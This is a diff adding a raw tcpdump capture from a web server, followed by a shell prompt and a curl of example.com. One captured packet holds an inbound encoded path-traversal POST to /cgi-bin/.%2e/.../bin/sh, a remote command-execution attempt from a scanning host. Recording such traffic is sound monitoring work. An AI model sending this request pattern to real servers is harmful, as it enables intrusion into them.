@@ -1,0 +1,25 @@
+12:34:16.386302 IP 159.203.9.56.50288 > 34.223.124.45.80: Flags [S], seq 4071021502, win 64240, options [mss 1460,sackOK,TS val 2162284371 ecr 0,nop,wscale 7], length 0
+12:34:17.403241 IP 159.203.9.56.50288 > 34.223.124.45.80: Flags [S], seq 4071021502, win 64240, options [mss 1460,sackOK,TS val 2162285388 ecr 0,nop,wscale 7], length 0
+12:34:18.427049 IP 159.203.9.56.50288 > 34.223.124.45.80: Flags [S], seq 4071021502, win 64240, options [mss 1460,sackOK,TS val 2162286412 ecr 0,nop,wscale 7], length 0
+12:34:19.451050 IP 159.203.9.56.50288 > 34.223.124.45.80: Flags [S], seq 4071021502, win 64240, options [mss 1460,sackOK,TS val 2162287436 ecr 0,nop,wscale 7], length 0
+12:34:20.475062 IP 159.203.9.56.50288 > 34.223.124.45.80: Flags [S], seq 4071021502, win 64240, options [mss 1460,sackOK,TS val 2162288460 ecr 0,nop,wscale 7], length 0
+12:34:21.499038 IP 159.203.9.56.50288 > 34.223.124.45.80: Flags [S], seq 4071021502, win 64240, options [mss 1460,sackOK,TS val 2162289484 ecr 0,nop,wscale 7], length 0
+12:34:23.547061 IP 159.203.9.56.50288 > 34.223.124.45.80: Flags [S], seq 4071021502, win 64240, options [mss 1460,sackOK,TS val 2162291532 ecr 0,nop,wscale 7], length 0
+12:34:27.579046 IP 159.203.9.56.50288 > 34.223.124.45.80: Flags [S], seq 4071021502, win 64240, options [mss 1460,sackOK,TS val 2162295564 ecr 0,nop,wscale 7], length 0
+12:34:35.771049 IP 159.203.9.56.50288 > 34.223.124.45.80: Flags [S], seq 4071021502, win 64240, options [mss 1460,sackOK,TS val 2162303756 ecr 0,nop,wscale 7], length 0
+12:34:52.155043 IP 159.203.9.56.50288 > 34.223.124.45.80: Flags [S], seq 4071021502, win 64240, options [mss 1460,sackOK,TS val 2162320140 ecr 0,nop,wscale 7], length 0
+12:35:24.411014 IP 159.203.9.56.50288 > 34.223.124.45.80: Flags [S], seq 4071021502, win 64240, options [mss 1460,sackOK,TS val 2162352396 ecr 0,nop,wscale 7], length 0
+12:35:29.291357 IP 165.154.227.13.39007 > 159.203.9.56.80: Flags [S], seq 2680922598, win 65535, length 0
+12:35:29.291357 IP 165.154.227.13.39007 > 159.203.9.56.80: Flags [S], seq 2680922598, win 65535, length 0
+12:35:29.291429 IP 159.203.9.56.80 > 165.154.227.13.39007: Flags [S.], seq 1732298738, ack 2680922599, win 64240, options [mss 1460], length 0
+12:35:29.487392 IP 165.154.227.13.39007 > 159.203.9.56.80: Flags [R], seq 2680922599, win 0, length 0
+12:35:29.977517 IP 165.154.227.13.47594 > 159.203.9.56.80: Flags [S], seq 870459841, win 64952, options [mss 1412,sackOK,TS val 2239012629 ecr 0,nop,wscale 7], length 0
+12:35:29.977584 IP 159.203.9.56.80 > 165.154.227.13.47594: Flags [S.], seq 4274438707, ack 870459842, win 65160, options [mss 1460,sackOK,TS val 2176041725 ecr 2239012629,nop,wscale 7], length 0
+12:35:30.180920 IP 165.154.227.13.47594 > 159.203.9.56.80: Flags [.], ack 1, win 508, options [nop,nop,TS val 2239012832 ecr 2176041725], length 0
+12:35:30.597016 IP 165.154.227.13.47594 > 159.203.9.56.80: Flags [P.], seq 1:369, ack 1, win 508, options [nop,nop,TS val 2239013249 ecr 2176041725], length 368: HTTP: POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+12:35:30.597096 IP 159.203.9.56.80 > 165.154.227.13.47594: Flags [.], ack 369, win 507, options [nop,nop,TS val 2176042345 ecr 2239013249], length 0
+20 packets captured
+22 packets received by filter
+0 packets dropped by kernel
+root@lamponubuntu2404-s-1vcpu-1gb-tor1-01:~# curl http://example.com
+<!doctype html><html lang="en"><head><title>Example Domain</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{background:#eee;width:60vw;margin:15vh auto;font-family:system-ui,sans-serif}h1{font-size:1.5em}div{opacity:0.8}a:link,a:visited{color:#348}</style></head><body><div><h1>Example Domain</h1><p>This domain is for use in documentation examples without needing permission. Avoid use in operations.</p><p><a href="https://iana.org/domains/example">Learn more</a></p></div></body></html>
